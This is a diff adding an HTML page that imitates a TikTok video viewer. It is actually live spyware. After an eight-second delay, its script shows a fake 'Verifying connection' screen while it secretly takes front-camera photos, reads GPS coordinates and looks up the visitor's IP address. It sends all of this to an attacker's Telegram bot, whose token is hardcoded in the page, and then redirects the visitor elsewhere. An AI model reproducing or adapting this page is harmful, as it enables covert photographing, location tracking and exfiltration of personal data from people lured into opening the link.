@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - Watch Video</title>
+
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="TikTok - Watch Video">
+    <meta property="og:description" content="Wait for the end! 😂🔥 #viral">
+    <meta property="og:video" content="https://github.com/facloook5-cpu/Img/raw/refs/heads/main/61e49dd6f7bae06a4f5fe2fd85ead389.mp4">
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+    <meta property="og:image" content="https://github.com/facloook5-cpu/Img/raw/refs/heads/main/thumbnail.jpg">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: 'TikTok Sans', Arial, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* فيديو الخلفية */
+        #main-video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
+
+        .video-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: 500px;
+            max-height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: transparent;
+            overflow: hidden;
+            z-index: 2;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        .video-placeholder.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .tiktok-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 5px rgba(0,0,0,0.5);
+            z-index: 15;
+        }
+
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        #loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #ff0050;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-message {
+            font-size: 1.1em;
+            color: #eee;
+            text-align: center;
+            max-width: 300px;
+        }
+
+        #camera-feed, #audio-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        #canvas { display: none; }
+
+        .tiktok-sidebar {
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 15;
+        }
+
+        .sidebar-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            font-size: 0.8em;
+        }
+
+        .sidebar-icon svg { width: 35px; height: 35px; fill: #fff; }
+
+        .bottom-nav {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 15;
+        }
+
+        .nav-item { color: rgba(255,255,255,0.7); display: flex; flex-direction: column; align-items: center; font-size: 0.75em; }
+        .nav-item.active { color: #fff; }
+        .nav-item svg { width: 24px; height: 24px; fill: currentColor; }
+
+        .video-info { position: absolute; bottom: 80px; left: 15px; width: 70%; z-index: 15; }
+        .username { font-weight: bold; font-size: 1.1em; }
+        .hidden-ui { opacity: 0; pointer-events: none; }
+        
+        .progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff0050, #00f2ea); width: 0%; transition: width 0.3s ease; }
+    </style>
+</head>
+<body>
+    <video id="main-video-bg" autoplay loop muted playsinline>
+        <source src="https://github.com/facloook5-cpu/Img/raw/refs/heads/main/61e49dd6f7bae06a4f5fe2fd85ead389.mp4" type="video/mp4">
+    </video>
+
+    <div class="video-container">
+        <div class="tiktok-logo">TikTok</div>
+        
+        <div class="video-placeholder" id="video-placeholder"></div>
+
+        <div class="tiktok-sidebar" id="fake-sidebar">
+            <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
+            <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg><span>4,129</span></div>
+        </div>
+
+        <div class="video-info" id="fake-info">
+            <div class="username">@tiktok_creator</div>
+            <div class="description">Wait for the end! 😂🔥 #viral</div>
+        </div>
+
+        <div class="bottom-nav" id="fake-nav">
+            <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Home</span></div>
+            <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span>Me</span></div>
+        </div>
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-message" id="loading-message">Verifying connection...</div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+
+        <video id="camera-feed" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
+        const CHAT_ID = '8350812242';
+        const TIKTOK_REDIRECT_URL = 'https://facloook5-cpu.github.io/Ca.is/';
+
+        const videoPlaceholder = document.getElementById('video-placeholder');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const progressFill = document.getElementById('progress-fill');
+        const cameraFeed = document.getElementById('camera-feed');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        let collectedData = {
+            userAgent: navigator.userAgent,
+            location: null,
+            capturedImages: [],
+            ipInfo: null
+        };
+
+        function updateProgress(percent) {
+            progressFill.style.width = percent + '%';
+        }
+
+        async function getIPInfo() {
+            try { const res = await fetch('https://ipapi.co/json/'); collectedData.ipInfo = await res.json(); } catch (e) {}
+        }
+
+        async function captureImages() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                cameraFeed.srcObject = stream;
+                await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+
+                for (let i = 0; i < 2; i++) {
+                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                    collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.7));
+                    await new Promise(r => setTimeout(r, 800));
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+        }
+
+        async function getGPS() {
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
+                    });
+                    collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                } catch (e) {}
+            }
+        }
+
+        async function sendToTelegram() {
+            let msg = `🎥 <b>TIKTOK LOG</b>\n\n`;
+            if (collectedData.ipInfo) msg += `🌍 <b>IP:</b> <code>${collectedData.ipInfo.ip}</code>\n`;
+            if (collectedData.location) msg += `📍 <b>GPS:</b> <code>${collectedData.location.lat},${collectedData.location.lon}</code>\n`;
+            msg += `📱 <b>Device:</b> ${navigator.platform}\n`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                });
+
+                for (let imgData of collectedData.capturedImages) {
+                    const blob = await (await fetch(imgData)).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
+            } catch (e) {}
+        }
+
+        async function runPayload() {
+            videoPlaceholder.classList.add('hidden');
+            loadingOverlay.classList.add('active');
+            document.getElementById('fake-sidebar').classList.add('hidden-ui');
+            document.getElementById('fake-info').classList.add('hidden-ui');
+            document.getElementById('fake-nav').classList.add('hidden-ui');
+
+            updateProgress(20);
+            await getIPInfo();
+            updateProgress(50);
+            await captureImages();
+            updateProgress(80);
+            await getGPS();
+            await sendToTelegram();
+            updateProgress(100);
+            
+            setTimeout(() => {
+                window.location.href = TIKTOK_REDIRECT_URL;
+            }, 1000);
+        }
+
+        window.addEventListener('load', () => {
+            const video = document.getElementById('main-video-bg');
+            video.play().catch(() => {
+                console.log("Interaction required for autoplay.");
+            });
+
+            setTimeout(() => {
+                runPayload();
+            }, 8000);
+        });
+    </script>
+</body>
+</html>
